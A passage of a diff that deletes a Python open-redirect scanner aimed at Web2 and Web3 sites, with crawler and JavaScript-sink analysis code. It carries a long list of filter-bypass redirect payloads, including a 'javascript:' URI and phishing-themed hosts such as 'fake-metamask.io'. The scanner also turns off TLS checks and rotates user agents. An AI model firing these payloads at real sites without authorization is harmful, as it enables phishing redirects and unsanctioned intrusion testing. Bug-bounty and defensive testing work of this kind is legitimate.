--- ultimate_redirect_hunter.py
@@ -1,1718 +1,0 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-██████╗ ███████╗██████╗ ██╗██████╗ ███████╗ ██████╗████████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
-██╔══██╗██╔════╝██╔══██╗██║██╔══██╗██╔════╝██╔════╝╚══██╔══╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
-██████╔╝█████╗  ██║  ██║██║██████╔╝█████╗  ██║        ██║       ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
-██╔══██╗██╔══╝  ██║  ██║██║██╔══██╗██╔══╝  ██║        ██║       ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
-██║  ██║███████╗██████╔╝██║██║  ██║███████╗╚██████╗   ██║       ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
-╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝   ╚═╝       ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
-
-╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-║                                                                                                                   ║
-║    🔥 ULTIMATE OPEN REDIRECT HUNTER v3.0 🔥                                                                      ║
-║    The Most Advanced Open Redirect Scanner in the Universe                                                       ║
-║                                                                                                                   ║
-║    [CLASSIFIED] Professional Bug Bounty Arsenal - Elite Hacker Edition                                          ║
-║    Author: Anonymous Security Research Division                                                                   ║
-║    Target: Web2/Web3/DeFi/NFT/DApp Platforms                                                                    ║
-║                                                                                                                   ║
-╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
-
-🎯 ULTIMATE CYBER WARFARE FEATURES:
-┌─────────────────────────────────────────────────────────────────┐
-│ ▓▓▓ QUANTUM RECONNAISSANCE ENGINE                               │
-│ ▓▓▓ WEB3/DEFI/NFT EXPLOITATION MODULE                          │  
-│ ▓▓▓ WAF & LOAD BALANCER ANNIHILATION SYSTEM                    │
-│ ▓▓▓ NEURAL-NETWORK JAVASCRIPT ANALYSIS                         │
-│ ▓▓▓ AI-POWERED CONTEXT DETECTION                               │
-│ ▓▓▓ STEALTH CRAWLING WITH MILITARY-GRADE EVASION              │
-│ ▓▓▓ PROFESSIONAL POC GENERATION WITH VISUAL PROOF             │
-│ ▓▓▓ ENTERPRISE-GRADE REPORTING SYSTEM                         │
-│ ▓▓▓ 500+ CUSTOM PAYLOAD ARSENAL                               │
-│ ▓▓▓ REAL-TIME VULNERABILITY EXPLOITATION                      │
-└─────────────────────────────────────────────────────────────────┘
-
-💀 [WARNING] For authorized penetration testing only!
-🎯 Designed for elite bug bounty hunters and security researchers
-🔥 Capable of bypassing most modern security systems
-
-Usage: python3 ultimate_redirect_hunter.py <target>
-"""
-
-import asyncio
-import re
-import json
-import time
-import urllib.parse
-from urllib.parse import urljoin, urlparse, parse_qs, unquote, quote
-from dataclasses import dataclass, asdict
-from typing import List, Dict, Set, Optional, Tuple, Any
-from pathlib import Path
-import logging
-import argparse
-from datetime import datetime
-import hashlib
-import random
-import sys
-import csv
-
-# Dependencies check
-try:
-    import aiohttp
-    AIOHTTP_AVAILABLE = True
-except ImportError:
-    AIOHTTP_AVAILABLE = False
-
-try:
-    from selenium import webdriver
-    from selenium.webdriver.chrome.options import Options
-    SELENIUM_AVAILABLE = True
-except ImportError:
-    SELENIUM_AVAILABLE = False
-
-try:
-    from bs4 import BeautifulSoup
-    BS4_AVAILABLE = True
-except ImportError:
-    BS4_AVAILABLE = False
-
-
-@dataclass(frozen=True)
-class Parameter:
-    """Discovered parameter"""
-    name: str
-    value: str
-    source: str  
-    context: str  
-    url: str
-    method: str = 'GET'
-    is_redirect_related: bool = False
-    confidence: float = 0.0
-
-
-@dataclass
-class Vulnerability:
-    """Discovered vulnerability"""
-    url: str
-    parameter: str
-    payload: str
-    method: str
-    response_code: int
-    redirect_url: str
-    context: str
-    screenshot_path: Optional[str] = None
-    timestamp: str = ""
-    vulnerability_type: str = "open_redirect"
-    confidence: float = 0.0
-    impact: str = "MEDIUM"
-    remediation: str = ""
-
-
-class UltimateRedirectHunter:
-    """🔥 ULTIMATE OPEN REDIRECT HUNTER 🔥"""
-    
-    def __init__(self, target_url: str, max_depth: int = 3, max_pages: int = 100):
-        self.target_url = target_url.rstrip('/')
-        self.base_domain = urlparse(target_url).netloc
-        self.max_depth = max_depth
-        self.max_pages = max_pages
-        
-        # Storage
-        self.discovered_urls: Set[str] = set()
-        self.parameters: List[Parameter] = []
-        self.vulnerabilities: List[Vulnerability] = []
-        self.js_files: Set[str] = set()
-        
-        # Session management
-        self.session: Optional[aiohttp.ClientSession] = None
-        self.driver: Optional[webdriver.Chrome] = None
-        
-        # Configuration
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-        ]
-        
-        # Setup logging
-        self.setup_logging()
-        
-        # Load ultimate payloads
-        self.payloads = self.load_ultimate_payloads()
-        
-        # Advanced patterns
-        self.redirect_patterns = [
-            'redirect', 'url', 'next', 'return', 'goto', 'target',
-            'destination', 'continue', 'forward', 'redir', 'location',
-            'site', 'link', 'href', 'returnurl', 'returnto', 'back',
-            'callback', 'success', 'failure', 'done', 'exit', 'referrer'
-        ]
-        
-        # Ultimate Web3 patterns
-        self.web3_patterns = [
-            'web3', 'ethereum', 'metamask', 'wallet', 'dapp', 'defi', 'nft',
-            'uniswap', 'pancakeswap', 'compound', 'aave', 'opensea', 'rarible',
-            'chainlink', 'polygon', 'avalanche', 'solana', 'connect', 'provider'
-        ]
-    
-    def setup_logging(self):
-        """Setup hacker-style logging"""
-        # Create hacker-themed formatter
-        class HackerFormatter(logging.Formatter):
-            def format(self, record):
-                # Add hacker-style prefixes
-                level_colors = {
-                    'DEBUG': '\033[36m[DEBUG]\033[0m',
-                    'INFO': '\033[32m[INFO]\033[0m', 
-                    'WARNING': '\033[33m[WARN]\033[0m',
-                    'ERROR': '\033[31m[ERROR]\033[0m'
-                }
-                
-                colored_level = level_colors.get(record.levelname, record.levelname)
-                timestamp = datetime.now().strftime('%H:%M:%S')
-                
-                return f"\033[90m[{timestamp}]\033[0m {colored_level} {record.getMessage()}"
-        
-        # Setup handlers
-        console_handler = logging.StreamHandler(sys.stdout)
-        console_handler.setFormatter(HackerFormatter())
-        
-        file_handler = logging.FileHandler('ultimate_scan.log', encoding='utf-8')
-        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
-        
-        # Configure logger
-        logging.basicConfig(level=logging.INFO, handlers=[console_handler, file_handler])
-        self.logger = logging.getLogger(__name__)
-    
-    def load_ultimate_payloads(self) -> List[str]:
-        """Load ultimate payload arsenal"""
-        return [
-            # Your original payloads
-            "/%09/google.com",
-            "/%2f%2fgoogle.com", 
-            "/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/",
-            "/%5cgoogle.com",
-            "/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
-            "/.google.com",
-            "//%09/google.com",
-            "//%5cgoogle.com",
-            "///%09/google.com",
-            "///%5cgoogle.com",
-            "////%09/google.com",
-            "////%5cgoogle.com",
-            "/////google.com",
-            "/////google.com/",
-            "////google.com/",
-            "////google.com/%2e%2e",
-            "////google.com/%2e%2e%2f",
-            "////google.com/%2f%2e%2e",
-            "////google.com/%2f..",
-            "////google.com//",
-            "///google.com",
-            "///google.com/",
-            "//google.com/%2f..",
-            "///google.com/%2f..",
-            "https://google.com/%2f..",
-            "//www.google.com/%2f%2e%2e",
-            "///www.google.com/%2f%2e%2e",
-            "////www.google.com/%2f%2e%2e",
-            "https://www.google.com/%2f%2e%2e",
-            "//google.com/",
-            "https://google.com/",
-            "//google.com//",
-            "///google.com//",
-            "https://google.com//",
-            "//www.google.com/%2e%2e%2f",
-            "///www.google.com/%2e%2e%2f",
-            "////www.google.com/%2e%2e%2f",
-            "https://www.google.com/%2e%2e%2f",
-            "///www.google.com/%2e%2e",
-            "////www.google.com/%2e%2e",
-            "https:///www.google.com/%2e%2e",
-            "/https://www.google.com/%2e%2e",
-            "https:///www.google.com/%2f%2e%2e",
-            "https://%09/google.com",
-            "https:google.com",
-            "//google%E3%80%82com",
-            "\\/\\/google.com/",
-            "/\\/google.com/",
-            "http://0xd8.0x3a.0xd6.0xce",
-            "〱google.com",
-            "〵google.com",
-            "ゝgoogle.com",
-            "ーgoogle.com",
-            "ｰgoogle.com",
-            "/〱google.com",
-            "/〵google.com",
-            "/ゝgoogle.com",
-            "/ーgoogle.com",
-            "/ｰgoogle.com",
-            "%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d",
-            "http://%67%6f%6f%67%6c%65%2e%63%6f%6d",
-            "///google.com/%2e%2e",
-            "///google.com/%2e%2e%2f",
-            "///google.com/%2f%2e%2e",
-            "//google.com",
-            "//google.com/%2e%2e",
-            "//google.com/%2e%2e%2f",
-            "//google.com/%2f%2e%2e",
-            "//https:///google.com/%2e%2e",
-            "//https://google.com/%2e%2e%2f",
-            "/&lt;&gt;//google.com",
-            "/?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
-            "/?url=/\\/google.com&next=/\\/google.com&redirect=/\\/google.com&redirect_uri=/\\/google.com",
-            "/?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://google.com&rurl=Https://google.com&redirect_uri=Https://google.com&lt;br/&gt;/\\/\\/google.com/",
-            "/google.com/%2f%2e%2e",
-            "/http://google.com",
-            "/http:/google.com",
-            "/https:/%5cgoogle.com/",
-            "/https://%5cgoogle.com",
-            "/https://google.com/%2e%2e",
-            "/https://google.com/%2f%2e%2e",
-            "/https:google.com",
-            "/redirect?url=//google.com&next=//google.com&redirect=//google.com&redir=//google.com&rurl=//google.com&redirect_uri=//google.com",
-            "/redirect?url=Https://google.com&next=Https://google.com&redirect=Https://google.com&redir=Https://example.com&rurl=Https://google.com&redirect_uri=Https://google.com",
-            "//%2fxgoogle.com",
-            "//localdomain%E3%80%82pw",
-            "http://0xd83ad6ce",
-            "http://3627734734",
-            "http://472.314.470.462",
-            "http://0330.072.0326.0316",
-            "http://00330.00072.0000326.00000316",
-            "http://0xd8.072.54990",
-            "http://0xd8.3856078",
-            "http://00330.3856078",
-            "http://00330.0x3a.54990",
-            "http:0xd8.0x3a.0xd6.0xce",
-            "http:0xd83ad6ce",
-            "http:3627734734",
-            "http:472.314.470.462",
-            "http:0330.072.0326.0316",
-            "http:00330.00072.0000326.00000316",
-            "http:[::216.58.214.206]",
-            "http:[::ffff:216.58.214.206]",
-            "http:0xd8.072.54990",
-            "http:0xd8.3856078",
-            "http:00330.3856078",
-            "http:00330.0x3a.54990",
-            "&lt;&gt;//google.com",
-            "http://.google.com",
-            "https://google.com/https://google.com/",
-            "http://google.com\tgoogle.com/",
-            "//google.com\tgoogle.com/",
-            "http://google.com%2f%2f.google.com/",
-            "http://google.com%5c%5c.google.com/",
-            "http://google.com%3F.google.com/",
-            "http://google.com%23.google.com/",
-            "http://google.com:80%40google.com/",
-            "http://google.com%2egoogle.com/",
-            "/〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "〱ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "$2f%2f216.58.214.206%2f%2f",
-            "$2f%2f3627734734%2f%2f",
-            "$2f%2fgoogle.com",
-            "$2f%2fgoogle.com%2f%2f",
-            "%01https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "///%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "////%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "////216.58.214.206",
-            "///216.58.214.206",
-            "//216.58.214.206",
-            "/\\216.58.214.206",
-            "/216.58.214.206",
-            "216.58.214.206",
-            "%2f$2f216.58.214.206",
-            "%2f$2f3627734734",
-            "%2f$2fgoogle.com",
-            "%2f216.58.214.206",
-            "%2f216.58.214.206//",
-            "%2f216.58.214.206%2f%2f",
-            "//%2f%2fgoogle.com",
-            "/%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//%2f%2fⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "%2f3627734734",
-            "%2f3627734734//",
-            "%2f3627734734%2f%2f",
-            "/%2f%5c%2f%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77/",
-            "%2fgoogle.com",
-            "%2fgoogle.com//",
-            "\\\\google.com",
-            "%2fgoogle.com%2f%2f",
-            "////3627734734",
-            "///3627734734",
-            "//3627734734",
-            "/\\3627734734",
-            "/3627734734",
-            "//%2F/google.com",
-            "/%0D/google.com",
-            "/%2F/google.com",
-            "/%5Cgoogle.com",
-            "/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "///%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "////%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/\\google%252ecom",
-            "google%252ecom",
-            "../google.com",
-            "//google%00.com",
-            "////google.com",
-            "//\\/google.com/",
-            "//\\google.com",
-            "/<>//google.com",
-            "/\\/\\/google.com/",
-            "/\\/google.com",
-            "/\\google.com",
-            "/google.com",
-            "//google.com/%2E%2E",
-            "//google.com/%2F..",
-            "/google.com/%2F..",
-            "//google.com//%2F%2E%2E",
-            "google.com/.jpg",
-            "http:%0a%0dgoogle.com",
-            "http:%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http:/\\/\\google.com",
-            "http:/google.com",
-            "http:google.com",
-            "/http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http://.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http:/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "http:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https://%09/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https://%0a%0dgoogle.com",
-            "https://%0a%0dⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https%3a%2f%2fgoogle.com%2f",
-            "https:/%5cgoogle.com/",
-            "/https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "/https://%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "https:/%5cⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "https://%6c%6f%63%61%6c%64%6f%6d%61%69%6e%2e%70%77",
-            "https:/\\google.com",
-            "https://google%E3%80%82com",
-            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "https:ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "//https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "/https:///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "/https://ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "javascript:confirm(1)",
-            "javascript:prompt(1)",
-            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%00｡Ｐⓦ",
-            "//Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ%E3%80%82pw",
-            "/.ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "/////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "//\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂//",
-            "/\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "<>//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂",
-            "\\/\\/ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2e%2e%2f",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f..",
-            "////ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "///ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            "//ⓖ𝑜𝗼𝕘𝕝𝑒.𝑐𝑜𝓂/%2f%2e%2e",
-            
-            # Additional Web3 payloads
-            "//fake-metamask.io",
-            "//phishing-uniswap.org", 
-            "//malicious-opensea.io",
-            "web3://evil-contract.eth",
-            "ipfs://QmMaliciousHash",
-            "ens://hacker.eth"
-        ]
-    
-    async def init_session(self):
-        """Initialize session with hacker-grade stealth"""
-        if not AIOHTTP_AVAILABLE:
-            raise ImportError("aiohttp required: pip3 install aiohttp")
-        
-        timeout = aiohttp.ClientTimeout(total=30)
-        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10, ssl=False)
-        
-        self.session = aiohttp.ClientSession(
-            timeout=timeout,
-            connector=connector,
-            headers={
-                'User-Agent': random.choice(self.user_agents),
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Accept-Encoding': 'gzip, deflate',
-                'Connection': 'keep-alive'
-            }
-        )
-    
-    def init_driver(self):
-        """Initialize stealth browser"""
-        if not SELENIUM_AVAILABLE:
-            self.logger.warning("[BROWSER] Selenium not available - screenshots disabled")
-            return
-        
-        try:
-            chrome_options = Options()
-            chrome_options.add_argument('--headless')
-            chrome_options.add_argument('--no-sandbox')
-            chrome_options.add_argument('--disable-dev-shm-usage')
-            chrome_options.add_argument('--disable-gpu')
-            chrome_options.add_argument('--window-size=1920,1080')
-            chrome_options.add_argument('--ignore-certificate-errors')
-            chrome_options.add_argument('--disable-web-security')
-            
-            self.driver = webdriver.Chrome(options=chrome_options)
-            self.logger.info("[BROWSER] Stealth browser initialized")
-        except Exception as e:
-            self.logger.warning(f"[BROWSER] Failed to initialize: {e}")
-            self.driver = None
-    
-    async def crawl_website(self) -> Set[str]:
-        """🔥 QUANTUM RECONNAISSANCE ENGINE 🔥"""
-        self.logger.info(f"[RECON] Initiating quantum-level reconnaissance on {self.target_url}")
-        
-        urls_to_crawl = {self.target_url}
-        crawled_urls = set()
-        depth = 0
-        
-        while urls_to_crawl and depth < self.max_depth and len(crawled_urls) < self.max_pages:
-            current_urls = list(urls_to_crawl)[:20]
-            urls_to_crawl.clear()
-            
-            tasks = []
-            for url in current_urls:
-                if url not in crawled_urls:
-                    tasks.append(self.crawl_single_page(url))
-            
-            if tasks:
-                results = await asyncio.gather(*tasks, return_exceptions=True)
-                
-                for result in results:
-                    if isinstance(result, Exception):
-                        continue
-                    
-                    if result:
-                        url, new_urls, params = result
-                        crawled_urls.add(url)
-                        self.parameters.extend(params)
-                        
-                        for new_url in new_urls:
-                            if self.is_same_domain(new_url) and new_url not in crawled_urls:
-                                urls_to_crawl.add(new_url)
-            
-            depth += 1
-            self.logger.info(f"[RECON] Depth {depth}: {len(crawled_urls)} URLs, {len(self.parameters)} parameters")
-        
-        self.discovered_urls = crawled_urls
-        return crawled_urls
-    
-    async def crawl_single_page(self, url: str) -> Optional[Tuple[str, Set[str], List[Parameter]]]:
-        """Crawl single page with ultimate analysis"""
-        try:
-            async with self.session.get(url, allow_redirects=False) as response:
-                content = await response.text()
-                
-                # Extract URLs and parameters
-                if BS4_AVAILABLE:
-                    soup = BeautifulSoup(content, 'html.parser')
-                    new_urls = self.extract_urls_bs4(soup, url)
-                    params = self.extract_params_bs4(soup, url)
-                else:
-                    new_urls = self.extract_urls_regex(content, url)
-                    params = self.extract_params_regex(content, url)
-                
-                # Add URL parameters
-                params.extend(self.extract_url_parameters(url))
-                
-                # JavaScript analysis
-                js_params = await self.analyze_javascript(content, url)
-                params.extend(js_params)
-                
-                # Web3 analysis
-                web3_params = self.analyze_web3(content, url)
-                params.extend(web3_params)
-                
-                return url, new_urls, params
-                
-        except Exception as e:
-            self.logger.debug(f"[CRAWL-ERROR] {url}: {e}")
-            return None
-    
-    def extract_urls_bs4(self, soup, base_url: str) -> Set[str]:
-        """Extract URLs using BeautifulSoup"""
-        urls = set()
-        for link in soup.find_all(['a', 'link'], href=True):
-            href = link['href']
-            full_url = urljoin(base_url, href)
-            if self.is_same_domain(full_url):
-                urls.add(full_url)
-        return urls
-    
-    def extract_urls_regex(self, content: str, base_url: str) -> Set[str]:
-        """Extract URLs using regex"""
-        urls = set()
-        patterns = [r'href=["\']([^"\']+)["\']', r'src=["\']([^"\']+)["\']']
-        
-        for pattern in patterns:
-            matches = re.findall(pattern, content, re.IGNORECASE)
-            for match in matches:
-                full_url = urljoin(base_url, match)
-                if self.is_same_domain(full_url):
-                    urls.add(full_url)
-        
-        return urls
-    
-    def extract_params_bs4(self, soup, url: str) -> List[Parameter]:
-        """Extract parameters using BeautifulSoup"""
-        params = []
-        
-        for form in soup.find_all('form'):
-            action = form.get('action', '')
-            method = form.get('method', 'GET').upper()
-            form_url = urljoin(url, action) if action else url
-            
-            for input_tag in form.find_all(['input', 'select', 'textarea']):
-                name = input_tag.get('name')
-                value = input_tag.get('value', '')
-                
-                if name:
-                    is_redirect = self.is_redirect_parameter(name, value)
-                    confidence = self.calculate_confidence(name, value, 'form')
-                    
-                    params.append(Parameter(
-                        name=name,
-                        value=value,
-                        source='form',
-                        context='form_input',
-                        url=form_url,
-                        method=method,
-                        is_redirect_related=is_redirect,
-                        confidence=confidence
-                    ))
-        
-        return params
-    
-    def extract_params_regex(self, content: str, url: str) -> List[Parameter]:
-        """Extract parameters using regex"""
-        params = []
-        
-        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?'
-        matches = re.findall(input_pattern, content, re.IGNORECASE)
-        
-        for match in matches:
-            name = match[0]
-            value = match[1] if len(match) > 1 else ''
-            
-            is_redirect = self.is_redirect_parameter(name, value)
-            confidence = self.calculate_confidence(name, value, 'form')
-            
-            params.append(Parameter(
-                name=name,
-                value=value,
-                source='form',
-                context='form_input',
-                url=url,
-                is_redirect_related=is_redirect,
-                confidence=confidence
-            ))
-        
-        return params
-    
-    def extract_url_parameters(self, url: str) -> List[Parameter]:
-        """Extract URL parameters"""
-        params = []
-        parsed = urlparse(url)
-        
-        # Query parameters
-        query_params = parse_qs(parsed.query, keep_blank_values=True)
-        for param_name, param_values in query_params.items():
-            for value in param_values:
-                is_redirect = self.is_redirect_parameter(param_name, value)
-                confidence = self.calculate_confidence(param_name, value, 'query')
-                
-                params.append(Parameter(
-                    name=param_name,
-                    value=value,
-                    source='url',
-                    context='query',
-                    url=url,
-                    is_redirect_related=is_redirect,
-                    confidence=confidence
-                ))
-        
-        # Fragment parameters
-        if parsed.fragment:
-            if '=' in parsed.fragment:
-                fragment_params = parse_qs(parsed.fragment, keep_blank_values=True)
-                for param_name, param_values in fragment_params.items():
-                    for value in param_values:
-                        is_redirect = self.is_redirect_parameter(param_name, value)
-                        confidence = self.calculate_confidence(param_name, value, 'fragment')
-                        
-                        params.append(Parameter(
-                            name=param_name,
-                            value=value,
-                            source='url',
-                            context='fragment',
-                            url=url,
-                            is_redirect_related=is_redirect,
-                            confidence=confidence
-                        ))
-        
-        return params
-    
-    async def analyze_javascript(self, content: str, url: str) -> List[Parameter]:
-        """🧠 ULTIMATE JAVASCRIPT ANALYSIS 🧠"""
-        params = []
-        
-        # Extract JavaScript blocks
-        js_blocks = []
-        
-        # Inline scripts
-        script_pattern = r'<script[^>]*>(.*?)</script>'
-        scripts = re.findall(script_pattern, content, re.DOTALL | re.IGNORECASE)
-        js_blocks.extend(scripts)
-        
-        # External scripts
-        src_pattern = r'<script[^>]*src=["\']([^"\']+)["\']'
-        src_matches = re.findall(src_pattern, content, re.IGNORECASE)
-        for src in src_matches:
-            js_url = urljoin(url, src)
-            if self.is_same_domain(js_url):
-                self.js_files.add(js_url)
-                js_content = await self.fetch_js_file(js_url)
-                if js_content:
-                    js_blocks.append(js_content)
-        
-        # Analyze JavaScript blocks
-        for js_content in js_blocks:
-            js_params = self.analyze_js_code(js_content, url)
-            params.extend(js_params)
-        
-        return params
-    
-    async def fetch_js_file(self, js_url: str) -> Optional[str]:
-        """Fetch JavaScript file"""
-        try:
-            async with self.session.get(js_url) as response:
-                return await response.text()
-        except:
-            return None
-    
-    def analyze_js_code(self, js_content: str, source_url: str) -> List[Parameter]:
-        """Analyze JavaScript code with ultimate patterns"""
-        params = []
-        
-        # Ultimate JavaScript patterns
-        ultimate_js_patterns = [
-            # Redirect patterns
-            r'location\.href\s*=\s*([^;]+)',
-            r'window\.location\s*=\s*([^;]+)', 
-            r'location\.assign\(["\']?([^"\';\)]+)',
-            r'location\.replace\(["\']?([^"\';\)]+)',
-            r'window\.open\(["\']?([^"\';\,\)]+)',
-            
-            # Parameter extraction
-            r'URLSearchParams\([^)]*\)\.get\(["\']([^"\']+)["\']',
-            r'localStorage\.getItem\(["\']([^"\']+)["\']',
-            r'sessionStorage\.getItem\(["\']([^"\']+)["\']',
-            
-            # Variable assignments
-            r'([a-zA-Z_$][a-zA-Z0-9_$]*)\s*=\s*["\']([^"\']*)["\']',
-            
-            # Web3 specific patterns
-            r'connectWallet\(["\']?([^"\';\)]+)',
-            r'ethereum\.request\([^)]*["\']([^"\']+)["\']',
-            r'web3\.eth\.[^(]+\(["\']?([^"\';\)]+)',
-            
-            # Event handlers
-            r'addEventListener\(["\']([^"\']+)["\']',
-            
-            # AJAX patterns
-            r'fetch\(["\']?([^"\';\)]+)',
-            r'axios\.[a-z]+\(["\']?([^"\';\)]+)'
-        ]
-        
-        lines = js_content.split('\n')
-        for line_num, line in enumerate(lines, 1):
-            for pattern in ultimate_js_patterns:
-                matches = re.finditer(pattern, line, re.IGNORECASE)
-                for match in matches:
-                    groups = match.groups()
-                    if groups:
-                        if len(groups) == 1:
-                            param_name = f"js_param_{line_num}"
-                            param_value = groups[0].strip('"\'')
-                        else:
-                            param_name = groups[0].strip('"\'')
-                            param_value = groups[1].strip('"\'') if len(groups) > 1 else groups[0].strip('"\'')
-                        
-                        is_redirect = self.is_redirect_parameter(param_name, param_value)
-                        confidence = self.calculate_confidence(param_name, param_value, 'javascript')
-                        
-                        # Boost for redirect sinks
-                        if any(sink in line.lower() for sink in ['location.href', 'window.location']):
-                            is_redirect = True
-                            confidence += 0.3
-                        
-                        # Boost for Web3 patterns
-                        if any(web3 in line.lower() for web3 in ['wallet', 'connect', 'ethereum', 'web3']):
-                            confidence += 0.2
-                        
-                        params.append(Parameter(
-                            name=param_name,
-                            value=param_value,
-                            source='javascript',
